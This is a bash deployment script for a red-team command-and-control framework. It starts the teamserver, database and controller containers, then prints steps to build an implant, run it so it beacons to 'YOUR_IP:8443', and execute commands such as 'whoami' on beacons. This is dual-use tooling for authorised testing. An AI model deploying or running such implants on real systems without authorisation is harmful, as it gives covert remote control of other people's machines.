#!/bin/bash
#
# Basic Deployment Script
# Automated deployment of Red Team C2 Framework for testing
#

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Functions
print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_info() {
    echo -e "${YELLOW}→${NC} $1"
}

print_header() {
    echo ""
    echo "=================================="
    echo "$1"
    echo "=================================="
    echo ""
}

# Check prerequisites
check_prerequisites() {
    print_header "Checking Prerequisites"

    # Check Docker
    if command -v docker &> /dev/null; then
        print_success "Docker installed: $(docker --version)"
    else
        print_error "Docker not installed"
        echo "Install from: https://docs.docker.com/get-docker/"
        exit 1
    fi

    # Check Docker Compose
    if command -v docker-compose &> /dev/null; then
        print_success "Docker Compose installed: $(docker-compose --version)"
    else
        print_error "Docker Compose not installed"
        echo "Install from: https://docs.docker.com/compose/install/"
        exit 1
    fi

    # Check Docker daemon
    if docker info &> /dev/null; then
        print_success "Docker daemon is running"
    else
        print_error "Docker daemon is not running"
        echo "Start Docker service and try again"
        exit 1
    fi
}

# Navigate to project root
navigate_to_root() {
    print_header "Navigating to Project Root"

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

    cd "$PROJECT_ROOT"
    print_success "Changed to: $PROJECT_ROOT"
}

# Stop existing services
stop_existing() {
    print_header "Stopping Existing Services"

    if docker-compose ps | grep -q "Up"; then
        print_info "Stopping running services..."
        docker-compose down
        print_success "Services stopped"
    else
        print_info "No running services found"
    fi
}

# Build images
build_images() {
    print_header "Building Docker Images"

    print_info "Building images (this may take a few minutes)..."
    docker-compose build --no-cache
    print_success "Images built successfully"
}

# Start services
start_services() {
    print_header "Starting Services"

    print_info "Starting containers..."
    docker-compose up -d
    print_success "Containers started"
}

# Wait for services
wait_for_services() {
    print_header "Waiting for Services to Initialize"

    print_info "Waiting for database to be healthy..."
    MAX_RETRIES=30
    RETRY_COUNT=0

    while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
        if docker-compose ps database | grep -q "healthy"; then
            print_success "Database is healthy"
            break
        fi

        RETRY_COUNT=$((RETRY_COUNT + 1))
        echo -n "."
        sleep 2
    done

    if [ $RETRY_COUNT -eq $MAX_RETRIES ]; then
        print_error "Database failed to become healthy"
        docker-compose logs database
        exit 1
    fi

    print_info "Waiting for teamserver to start..."
    sleep 5

    if docker-compose ps teamserver | grep -q "Up"; then
        print_success "Teamserver is running"
    else
        print_error "Teamserver failed to start"
        docker-compose logs teamserver
        exit 1
    fi
}

# Verify deployment
verify_deployment() {
    print_header "Verifying Deployment"

    print_info "Checking service status..."
    docker-compose ps

    echo ""
    print_info "Testing teamserver health endpoint..."

    if curl -k -s https://localhost:8443/health > /dev/null 2>&1; then
        print_success "Teamserver health check passed"
    else
        print_error "Teamserver health check failed"
        print_info "This may be normal if teamserver doesn't have a health endpoint"
    fi
}

# Print next steps
print_next_steps() {
    print_header "Deployment Complete!"

    echo "Services are running:"
    echo "  - Teamserver:  https://localhost:8443"
    echo "  - Database:    localhost:5432"
    echo "  - Controller:  docker-compose exec controller"
    echo ""
    echo "Next steps:"
    echo ""
    echo "1. Build implant:"
    echo "   cd implant"
    echo "   go build -o implant main.go"
    echo ""
    echo "2. Run implant (on authorized test system):"
    echo "   ./implant --server https://YOUR_IP:8443 --interval 60 --jitter 30 --insecure"
    echo ""
    echo "3. List beacons:"
    echo "   docker-compose exec controller python main.py beacons"
    echo ""
    echo "4. Execute command:"
    echo "   docker-compose exec controller python main.py exec BEACON_ID \"whoami\""
    echo ""
    echo "5. View logs:"
    echo "   docker-compose logs -f teamserver"
    echo ""
    echo "6. Stop services:"
    echo "   docker-compose down"
    echo ""
    print_success "Happy hacking! (Ethically and legally, of course)"
}

# Main execution
main() {
    print_header "Red Team C2 Framework - Basic Deployment"

    check_prerequisites
    navigate_to_root
    stop_existing
    build_images
    start_services
    wait_for_services
    verify_deployment
    print_next_steps
}

# Run main function
main
